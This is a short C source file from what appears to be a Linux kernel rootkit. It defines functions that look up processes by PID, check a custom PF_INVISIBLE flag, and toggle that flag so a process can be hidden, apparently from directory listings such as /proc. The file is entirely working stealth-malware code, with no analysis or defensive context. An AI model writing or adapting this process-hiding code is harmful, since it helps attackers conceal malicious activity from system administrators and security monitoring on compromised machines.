#include "../inc/proc.h"

#include <linux/dirent.h>
#include <linux/fdtable.h>

#include "../inc/def.h"
#include "../inc/util.h"

struct task_struct *
find_task_struct(pid_t pid) {
    struct task_struct *task = current;

    for_each_process(task)
        if (task->pid == pid)
            return task;

    return NULL;
}

int
is_invisible_pid(pid_t pid) {
    if (!pid)
        return 0;
    return is_invisible_task_struct(find_task_struct(pid));
}

int
is_invisible_task_struct(struct task_struct *task) {
    if (task)
        return task->flags & PF_INVISIBLE;
    return 0;
}

void
toggle_proc_invisability(struct task_struct *task) {
    if (task)
        task->flags ^= PF_INVISIBLE;
}
